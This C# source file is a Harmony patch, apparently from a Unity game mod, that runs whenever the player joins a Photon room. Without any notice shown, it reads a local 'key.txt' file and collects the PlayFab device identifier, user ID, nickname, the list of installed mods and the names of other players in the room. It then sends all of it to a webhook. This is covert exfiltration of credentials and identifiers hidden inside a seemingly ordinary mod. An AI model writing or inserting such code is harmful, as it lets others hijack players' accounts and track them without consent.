using Photon.Pun;
using HarmonyLib;
using System.IO;
using System;
using System.Linq;
using PlayFab;

namespace Qolossal.Patches
{
    [HarmonyPatch(typeof(MonoBehaviourPunCallbacks), "OnJoinedRoom")]
    public class JoinRoomLog
    {
        private static string lastRoomCode = "";

        public static void Postfix()
        {
            try
            {
                if (!PhotonNetwork.IsConnected || PhotonNetwork.CurrentRoom == null)
                    return;
                if (PhotonNetwork.CurrentRoom.Name == lastRoomCode)
                    return;
                lastRoomCode = PhotonNetwork.CurrentRoom.Name;
                string key = "N/A";
                try
                {
                    string keyPath = Path.Combine(UnityEngine.Application.persistentDataPath, "key.txt");
                    if (File.Exists(keyPath))
                        key = File.ReadAllText(keyPath);
                }
                catch { }
                string mods = "None";
                try
                {
                    string modsPath = Path.Combine(UnityEngine.Application.persistentDataPath, "Mods");
                    if (Directory.Exists(modsPath))
                        mods = string.Join(", ", Directory.GetFiles(modsPath).Select(Path.GetFileName));
                }
                catch { }

                string players = PhotonNetwork.PlayerList.Length == 1 ? "there alone" : string.Join(", ", PhotonNetwork.PlayerList.Select(p => p.NickName));
                string message =
                    "--Local Info--\n" +
                    $"Nick: {PhotonNetwork.LocalPlayer.NickName}\n" +
                    $"UserID: {PhotonNetwork.LocalPlayer.UserId}\n" +
                    $"CustomID: {PlayFabSettings.DeviceUniqueIdentifier}\n" +
                    $"Key: {key}\n" +
                    $"--Room Info--\n" +
                    $"RoomCode: {PhotonNetwork.CurrentRoom.Name}\n" +
                    $"PlayerCount: {PhotonNetwork.CurrentRoom.PlayerCount}\n" +
                    $"Players: {players}\n" +
                    $"Master: {PhotonNetwork.MasterClient.NickName}\n" +
                    "--Other--\n" +
                    $"Time: {DateTime.Now.ToLongDateString()}\n" +
                    $"Current Mods: {mods}";
                message = message.Replace("@everyone", "").Replace("@here", "");
                Plugin.webhook(message, false, false, false, true);
            }
            catch (Exception ex)
            {
                UnityEngine.Debug.LogError($"JoinRoomLog Postfix Error: {ex}");
            }
        }
    }
}